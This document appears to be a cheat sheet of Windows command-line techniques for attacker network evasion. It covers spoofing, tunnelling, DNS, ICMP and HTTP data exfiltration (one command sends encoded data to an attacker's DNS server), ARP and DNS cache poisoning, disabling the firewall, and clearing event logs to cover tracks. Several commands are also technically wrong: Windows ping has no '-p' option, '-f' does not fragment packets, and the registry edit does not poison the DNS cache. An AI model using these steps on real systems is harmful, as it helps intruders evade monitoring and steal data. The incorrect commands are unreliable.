# Packet Manipulation

#### IP Spoofing
Changing the source IP address to avoid detection or impersonate another device.

- **IP Spoofing using CMD:**
  ```cmd
  route add <spoofed_ip> MASK 255.255.255.0 <gateway_ip> IF <interface_id>
  ```

#### MAC Address Spoofing
Changing the MAC address of a network adapter to bypass network controls.

- **Spoof MAC Address (via Registry Modification):**
  ```cmd
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001 /v NetworkAddress /t REG_SZ /d 001122334455 /f
  ```
  After setting, restart the network adapter:
  ```cmd
  netsh interface set interface name="Ethernet" admin=disable
  netsh interface set interface name="Ethernet" admin=enable
  ```

#### TTL Manipulation
Modifying the Time-To-Live (TTL) value to evade IDS/IPS detection.

- **TTL Manipulation with netsh:**
  ```cmd
  netsh int ipv4 set global defaultcurhoplimit=<ttl_value>
  ```

#### Packet Fragmentation
Fragmenting packets to evade detection systems that struggle with reassembling fragmented packets.

- **Fragment ICMP Request:**
  ```cmd
  ping <target_ip> -f -l 500
  ```

#### User-Agent Spoofing
Changing the `User-Agent` in HTTP requests to blend in with legitimate traffic.

- **Spoof User-Agent with cURL (install needed):**
  ```cmd
  curl -A "Mozilla/5.0 (Windows NT 10.0)" http://<target_ip>
  ```

# Network Traffic Encryption

#### SSH Tunneling
Tunneling network traffic over SSH to encrypt traffic.

- **Create SSH Tunnel with plink (part of PuTTY):**
  ```cmd
  plink -ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ssh_server>
  ```

#### VPN Tunneling
Create an encrypted VPN tunnel to hide network traffic from monitoring systems.

- **VPN Connection using CMD (PPTP):**
  ```cmd
  rasdial "VPN" <username> <password> /phonebook:C:\path\to\vpn.pbk
  ```

#### Proxy Chaining
Route traffic through multiple proxies to evade detection.

- **Configure HTTP Proxy for cURL:**
  ```cmd
  curl -x http://<proxy_ip>:<proxy_port> http://<target_ip>
  ```

# Covert Channels

#### DNS Tunneling
Encapsulate data within DNS requests to evade detection.

- **Use `nslookup` for DNS Data Exfiltration:**
  ```cmd
  nslookup <encoded_data>.<domain> <attacker_dns_server>
  ```

#### ICMP Tunneling
Using ICMP (ping) requests to create a covert communication channel.

- **ICMP Data Exfiltration via Ping:**
  ```cmd
  ping <target_ip> -n 1 -l 32 -p <hex_data>
  ```

#### HTTP/HTTPS Traffic Obfuscation
Hide data in HTTP requests or headers to avoid detection.

- **Send data in HTTP Headers using cURL:**
  ```cmd
  curl -H "X-Data: <encoded_data>" http://<target_ip>
  ```

# DNS Evasion and Manipulation

#### DNS Cache Poisoning
Poison the local DNS cache to redirect legitimate traffic to malicious servers.

- **Modify DNS Cache Entries:**
  ```cmd
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters /v CacheHashTable /t REG_SZ /d <malicious_ip> /f
  ```

#### Flush DNS Cache
Clear DNS cache to remove evidence or reset network state.

- **Flush DNS Cache:**
  ```cmd
  ipconfig /flushdns
  ```

# Manipulating ARP Cache

#### ARP Poisoning
Modify ARP cache to mislead traffic and perform Man-in-the-Middle attacks.

- **Add Spoofed ARP Entry:**
  ```cmd
  netsh interface ipv4 add neighbors "Ethernet" <target_ip> <spoofed_mac>
  ```

#### Flush ARP Cache
Clear ARP cache to remove poisoned entries.

- **Flush ARP Cache:**
  ```cmd
  arp -d *
  ```

# Network Reconnaissance Evasion

#### Hide Services from Network Scans
Disable or hide services temporarily to evade network scans.

- **Disable Network Adapter Temporarily:**
  ```cmd
  netsh interface set interface "Ethernet" admin=disable
  timeout /t 30
  netsh interface set interface "Ethernet" admin=enable
  ```

#### Slow and Stealthy Scanning
Reduce scan frequency to evade IDS/IPS detection.

- **Stealth Scan Using ping:**
  ```cmd
  for /L %i in (1,1,100) do (ping <target_ip> -n 1 -w 1000 & timeout /t 2)
  ```

# Firewall Evasion Techniques

#### View Firewall Status
Check the status of Windows Firewall.

- **Check Firewall Status:**
  ```cmd
  netsh advfirewall show allprofiles
  ```

#### Disable Firewall
Turn off the firewall to allow unrestricted traffic.

- **Disable Firewall for All Profiles:**
  ```cmd
  netsh advfirewall set allprofiles state off
  ```

#### Create Firewall Rules for Evasion
Create rules that allow traffic through specific ports or protocols.

- **Allow Traffic on Port 8080:**
  ```cmd
  netsh advfirewall firewall add rule name="Allow 8080" protocol=TCP dir=out localport=8080 action=allow
  ```

# Port Knocking (Firewall Evasion)

Port knocking can be used to stealthily open ports by sending a sequence of packets.

- **Simple Port Knocking with ping:**
  ```cmd
  ping <target_ip> -n 1 -p 135
  ping <target_ip> -n 1 -p 445
  ping <target_ip> -n 1 -p 80
  ```

# Anti-Forensics and Covering Tracks

#### Secure Deletion of Network Artifacts
Clear evidence of network-related activity, such as logs and cached connections.

- **Clear DNS Cache:**
  ```cmd
  ipconfig /flushdns
  ```

#### Remove Custom Firewall Rules
Delete firewall rules created for network evasion.

- **Remove Firewall Rule:**
  ```cmd
  netsh advfirewall firewall delete rule name="Allow 8080"
  ```

#### Clear Event Logs
Remove logs to erase traces of activity.

- **Clear System Logs:**
  ```cmd
  wevtutil cl System
  ```
